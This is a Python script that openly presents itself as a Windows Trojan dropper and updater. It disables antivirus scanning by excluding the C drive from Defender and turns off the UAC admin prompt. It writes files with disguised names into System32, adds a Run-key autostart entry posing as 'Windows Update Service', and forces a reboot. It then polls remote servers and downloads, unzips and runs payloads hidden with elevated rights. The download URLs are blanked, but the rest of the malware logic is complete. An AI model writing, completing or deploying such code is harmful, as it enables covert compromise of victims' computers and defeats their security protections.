from os import system, path
from time import sleep
from requests import get


r""" Definition of all created files

Main Trojan current file
C:\Windows\System32\ntoskernel.exe

Trojan Trigger opens Trojan Main without window
C:\Windows\System32\ntoskernel-service.vbs

Trojan Guard checks if the Trojan Locker and Trojan is running | keeps them running
C:\Windows\System32\ntoskernel-guard.bat

Trojan Locker checks if the Trojan Guard is running | keeps it running
C:\Windows\System32\ntoskernel-locker.bat

Trojan Version is saving the current Trojan Version
C:\Windows\System32\ntoskernel-version

Trojan Version Update is storing the newest version | updated every 15min
C:\Windows\System32\ntoskernel-version-update

Trojan Payload contains all the payloads which are getting executed 
C:\Windows\System32\payload.zip

Trojan Update is a dummy and waits to getting killed
C:\Windows\System32\ntoskernel\update.exe

Trojan Service Update is killing every payload if the Trojan Update dummy is getting killed
C:\Windows\System32\ntoskernel\update-service.exe
"""


def timeout():
    # sleep(3600) #1h
    sleep(15)  # Debug sleeping only 15 secs


def check_if_version_exists():
    if path.exists("C:\\Windows\\System32\\ntoskernel-version"):
        return True
    else:
        return False


def check_if_trojan_exists():
    if path.exists("C:\\Windows\\System32\\ntoskernel.exe"):
        return True
    else:
        return False


def download_payloads():
    # downloading the newest trojan file
    trojan = 'https://'
    trojan_data = get(trojan)

    # downloading the "ntoskernel-service.bat" file
    trojan_service = 'https://'
    trojan_service_data = get(trojan_service)

    # downloading the "ntoskernel-service.bat" file
    trojan_guard = 'https://'
    trojan_guard_data = get(trojan_guard)

    # downloading the "ntoskernel-service.bat" file
    trojan_locker = 'https://'
    trojan_locker_data = get(trojan_locker)

    # saving all the downloaded data
    open("C:\\Windows\\System32\\ntoskernel.exe", 'wb').write(trojan_data.content)
    open("C:\\Windows\\System32\\ntoskernel-service.vbs", 'wb').write(trojan_service_data.content)
    open("C:\\Windows\\System32\\ntoskernel-guard.bat", 'wb').write(trojan_guard_data.content)
    open("C:\\Windows\\System32\\ntoskernel-locker.bat", 'wb').write(trojan_locker_data.content)


def check_version():
    if check_if_version_exists() is True:
        # deleting the new version if it exists
        if path.exists("C:\\Windows\\System32\\ntoskernel-version-update"):
            system("del C:\\Windows\\System32\\ntoskernel-version-update")

        # getting the current payload version
        ntoskernel_version_update = "https://"
        ntoskernel_version_update_data = get(ntoskernel_version_update)

        # saving the current payload version
        open("C:\\Windows\\System32\\ntoskernel-version-update", "wb").write(ntoskernel_version_update_data.content)

        # comparing the new version with the current one
        with open("C:\\Windows\\System32\\ntoskernel-version", "r") as data:
            version = data.read()
            data.close()
        with open("C:\\Windows\\System32\\ntoskernel-version-update", "r") as data:
            version_update = data.read()
            data.close()

        if version == version_update:
            timeout()
            check_version()
        else:
            update()
            check_version()
    else:
        # manual version update
        open("C:\\Windows\\System32\\ntoskernel-version", "x").write("no version installed")
        check_version()


def update():
    # deleting all versions
    system("del C:\\Windows\\System32\\ntoskernel-version")
    system("del C:\\Windows\\System32\\ntoskernel-version-update")

    # downloading all versions
    version = 'https://'
    version_data = get(version)

    version_update = 'https://'
    version_data_update = get(version_update)

    # saving all versions
    open("C:\\Windows\\System32\\ntoskernel-version", 'wb').write(version_data.content)
    open("C:\\Windows\\System32\\ntoskernel-version-update", 'wb').write(version_data_update.content)

    # downloading the current payload
    payload = 'https://'
    payload_data = get(payload)

    # saving the payload
    open("C:\\Windows\\System32\\payload.zip", 'wb').write(payload_data.content)

    # if ntoskernel-update.exe is getting killed, the current payload will be stopped
    system("taskkill /im ntoskernel-update.exe /f")

    # waiting some seconds before continue
    sleep(15)

    system("rmdir C:\\Windows\\System32\\ntoskernel /s /q")
    system(r'"powershell -command \"Expand-Archive C:\Windows\System32\payload.zip C:\Windows\System32\ntoskernel\""')
    system("del C:\\Windows\\System32\\payload.zip")
    system(r'"powershell -c \"Start-Process -Verb RunAs -WindowStyle hidden '
           r'C:\Windows\System32\ntoskernel\trigger.vbs\""')


def setup():
    print("Starting the Trojan")

    # disabling the antivirus via C drive exclusion
    system(r'powershell -c "Add-MpPreference -ExclusionPath \"C:\\\""')

    # disabling the UAC prompt
    system(r'powershell -c "Set-ItemProperty -Path '
           r'REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System '
           r'-Name ConsentPromptBehaviorAdmin -Value 0"')

    # removing files if they exist
    system(r'powershell -c "Remove-Item C:\\Windows\\System32\\ntoskernel.exe -Force -ErrorAction '
           r'SilentlyContinue')
    system(r'powershell -c "Remove-Item C:\\Windows\\System32\\ntoskernel-service.vbs -Force -ErrorAction '
           r'SilentlyContinue')
    system(r'powershell -c "Remove-Item C:\\Windows\\System32\\ntoskernel-guard.bat -Force -ErrorAction '
           r'SilentlyContinue')
    system(r'powershell -c "Remove-Item C:\\Windows\\System32\\ntoskernel-locker.bat -Force -ErrorAction '
           r'SilentlyContinue')
    system(r'powershell -c "Remove-Item C:\\Windows\\System32\\ntoskernel-version -Force -ErrorAction '
           r'SilentlyContinue')
    system(r'powershell -c "Remove-Item C:\\Windows\\System32\\ntoskernel-version-update -Force -ErrorAction '
           r'SilentlyContinue')
    system(r'powershell -c "Remove-Item C:\\Windows\\System32\\payload.zip -Force -ErrorAction '
           r'SilentlyContinue')
    system(r'powershell -c "Remove-Item C:\\Windows\\System32\\ntoskernel-update.exe -Force -ErrorAction '
           r'SilentlyContinue')

    # downloading all needed files
    download_payloads()

    # creating a trojan autostart registry key
    system(r'reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows Update Service" /t REG_SZ /f /d '
           r'"C:\Windows\System32\ntoskernel-service.vbs"')

    # restarting the machine
    system('shutdown /r /t 0')


def main():
    # creating the payload folder if needed
    if path.exists("C:\\Windows\\System32\\ntoskernel"):
        pass
    else:
        system("mkdir C:\\Windows\\System32\\ntoskernel")

    # calling setup if needed
    if check_if_trojan_exists() is False:
        setup()
    else:
        check_version()


if __name__ == "__main__":
    main()
